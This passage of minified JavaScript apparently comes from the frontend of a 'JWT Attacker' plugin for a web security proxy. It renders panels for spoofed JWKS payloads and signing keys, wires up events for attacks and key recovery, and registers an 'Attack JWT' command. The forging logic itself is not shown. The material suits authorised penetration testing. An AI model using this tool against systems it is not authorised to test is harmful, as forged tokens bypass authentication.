                  " Host this JSON at your configured JWKS URL so the server can fetch the attacker's public key. ",
                  -1
                  /* CACHED */
                )),
                x(
                  "pre",
                  H0,
                  E(s.value.jwksJson),
                  1
                  /* TEXT */
                ),
                x("button", {
                  onClick: c[2] || (c[2] = (g) => l(s.value.jwksJson)),
                  class: "mt-1 text-xs text-gray-500 hover:text-gray-300"
                }, "Copy JWKS")
              ]),
              s.value.jwksPrivateKey ? (P(), A("div", W0, [
                c[8] || (c[8] = x(
                  "p",
                  { class: "text-xs text-gray-400 mb-2" },
                  "Private key used to sign the spoofed tokens:",
                  -1
                  /* CACHED */
                )),
                x(
                  "pre",
                  J0,
                  E(s.value.jwksPrivateKey),
                  1
                  /* TEXT */
                ),
                x("button", {
                  onClick: c[3] || (c[3] = (g) => l(s.value.jwksPrivateKey)),
                  class: "mt-1 text-xs text-gray-500 hover:text-gray-300"
                }, "Copy Private Key")
              ])) : L("v-if", !0)
            ])
          ])
        ])) : L("v-if", !0)
      ]);
    };
  }
});
function G0(e) {
  console.log("[JWT Attacker] init() called");
  const t = Xl(U0), r = ec();
  t.use(r), t.use(Yc, { unstyled: !0, pt: Dd });
  const o = document.createElement("div");
  o.id = "plugin--jwt-attacker-root", o.style.cssText = "height:100%;width:100%;overflow:hidden;", t.mount(o), e.navigation.addPage("/jwt-attacker", { body: o }), e.sidebar.registerItem("JWT Attacker", "/jwt-attacker", { icon: "fas fa-key" });
  const s = Ta();
  s.setSDK(e), s.load();
  const n = Sa();
  e.backend.onEvent("jwt-attack-started", ({ sessionId: i, requestId: a, total: l }) => {
    console.log("[JWT Attacker] event: jwt-attack-started", { sessionId: i, requestId: a, total: l }), n.startSession(i, a, l), e.navigation.goTo("/jwt-attacker");
  }), e.backend.onEvent("jwt-attack-result", ({ sessionId: i, result: a }) => {
    n.addResult(i, a);
  }), e.backend.onEvent("jwt-attack-complete", ({ sessionId: i, errors: a }) => {
    console.log("[JWT Attacker] event: jwt-attack-complete", { sessionId: i, errors: a }), n.completeSession(i, a);
  }), e.backend.onEvent("jwt-key-recovery-progress", ({ sessionId: i, message: a }) => {
    n.logKeyRecovery(i, a);
  }), e.backend.onEvent("jwt-key-recovery-complete", ({ sessionId: i, keys: a }) => {
    for (const l of a) n.addRecoveredKey(i, l);
  }), e.backend.onEvent("jwks-payload", ({ sessionId: i, jwksJson: a, privateKeyPem: l }) => {
    n.setJWKSPayload(i, a, l);
  }), e.backend.onEvent("jwks-found", ({ sessionId: i, url: a, source: l, keyCount: u, content: c, pems: p }) => {
    n.addDiscoveredEndpoint(i, { url: a, source: l, keyCount: u, content: c, pems: p });
  }), e.commands.register("jwt-attacker.attack", {
    name: "Attack JWT",
    group: "JWT Attacker",
    run: async (i) => {
      console.log("[JWT Attacker] run() called, context.type =", i.type);
      const a = [];
      if (i.type === "RequestRowContext")
        for (const u of i.requests)
          a.push(u.id);
      else if (i.type === "RequestContext") {
        const u = i.request;
        "id" in u && u.id && a.push(u.id);
      }
      if (console.log("[JWT Attacker] requestIds:", a), a.length === 0) {
        console.warn("[JWT Attacker] No request IDs found in context");
        return;
      }
      const l = JSON.parse(JSON.stringify(s.config));
      console.log("[JWT Attacker] config being sent:", l);
      for (const u of a) {
        console.log("[JWT Attacker] calling backend attackJwt for id:", u);
        try {
          const c = await e.backend.attackJwt(u, l);
          console.log("[JWT Attacker] backend call returned:", c);
        } catch (c) {
          console.error("[JWT Attacker] backend call failed:", c);
        }
      }
    }
  }), e.menu.registerItem({
    type: "RequestRow",
    commandId: "jwt-attacker.attack",
    leadingIcon: "fas fa-key"
  }), e.menu.registerItem({
    type: "Request",
    commandId: "jwt-attacker.attack",
    leadingIcon: "fas fa-key"
  }), console.log("[JWT Attacker] init() complete — commands and menu items registered");
}
export {
  G0 as init
};
